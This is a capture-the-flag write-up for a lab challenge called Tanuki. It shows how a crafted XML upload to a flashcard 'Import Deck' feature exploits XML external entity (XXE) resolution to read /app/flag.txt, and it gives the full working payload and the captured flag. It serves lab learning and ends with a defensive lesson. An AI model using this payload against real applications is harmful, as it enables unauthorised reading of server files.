# Tanuki - tanuki-002 - XXE.

**XML External Entity (XXE)**

## 1. Identify the Import Feature

After registering/logging into the Tanuki application, I found an option called **Import Deck**.

The application allows users to create custom flashcard decks by uploading either:

* JSON
* XML

Since the challenge hint was **XXE**, the XML upload functionality was the primary attack surface.

---

## 2. Download the XML Template

The application provides a sample deck template.

The XML structure was:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<deck>
    <name>Example Deck</name>
    <description>Example Description</description>
    <category>Example</category>
    <cards></cards>
</deck>
```

The important fields were:

```xml
<name>
<description>
<category>
<cards>
```

---

## 3. Test for XXE

Because the application parses XML, I tested whether it allowed an external entity declaration.

I modified the XML to define an entity pointing to the application's flag file:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE deck [
    <!ENTITY xxe SYSTEM "file:///app/flag.txt">
]>
<deck>
    <name>&xxe;</name>
    <description>XXE Test</description>
    <category>Example</category>
    <cards></cards>
</deck>
```

### Important parts

The following declaration creates an external entity:

```xml
<!ENTITY xxe SYSTEM "file:///app/flag.txt">
```

The entity is then referenced inside the deck:

```xml
<name>&xxe;</name>
```

When the XML parser processes the file, it resolves `&xxe;` and reads:

```text
/app/flag.txt
```

---

## 4. Upload the Malicious XML

I saved the payload as:

```text
xxe.xml
```

Then I went to:

**Import Deck → Upload XML**

and uploaded the malicious XML file.

The application successfully created the deck.

---

## 5. Retrieve the Flag

The contents of `/app/flag.txt` were inserted into the deck's **name** field.

The resulting deck name contained:

```text
bug{KHcKlEOHMZNo2xCOlXlMDs9ABsIJo0wX}
```

Therefore, the flag was:

```text
bug{KHcKlEOHMZNo2xCOlXlMDs9ABsIJo0wX}
```

---

## 6. Why It Worked

The application was processing user-controlled XML while allowing **external entity resolution**.

The attack flow was:

```text
Malicious XML
     ↓
XML Parser
     ↓
DOCTYPE defines external entity
     ↓
&xxe; references /app/flag.txt
     ↓
Parser reads local file
     ↓
File contents placed in <name>
     ↓
Deck is created
     ↓
Flag is revealed
```

This is a classic **XXE Local File Disclosure** vulnerability.

## Final Payload

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE deck [
    <!ENTITY xxe SYSTEM "file:///app/flag.txt">
]>
<deck>
    <name>&xxe;</name>
    <description>XXE Test</description>
    <category>Example</category>
    <cards></cards>
</deck>
```

## Flag

```text
bug{KHcKlEOHMZNo2xCOlXlMDs9ABsIJo0wX}
```

## Key Takeaway

When an application accepts XML uploads, always check whether the underlying XML parser allows **DOCTYPE declarations and external entity resolution**. If enabled, XXE can potentially allow an attacker to read local files accessible to the application.